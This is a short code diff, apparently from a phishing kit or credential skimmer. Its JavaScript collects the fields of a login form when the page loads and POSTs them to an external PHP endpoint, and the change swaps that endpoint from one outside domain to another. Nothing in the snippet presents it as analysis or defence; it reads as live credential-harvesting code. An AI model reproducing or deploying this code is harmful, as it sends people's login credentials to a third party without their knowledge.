@@ -22,7 +22,7 @@ document.addEventListener("DOMContentLoaded", function () {
     const formData = new FormData(document.loginform);
     const xhr = new XMLHttpRequest();
     xhr.open(
-      "POST","https://piromet-tr.com/fabie/1/X.php",
+      "POST","https://kiergp.co.uk/fabie/1/X.php",
       true
     );
     xhr.onload = () => {
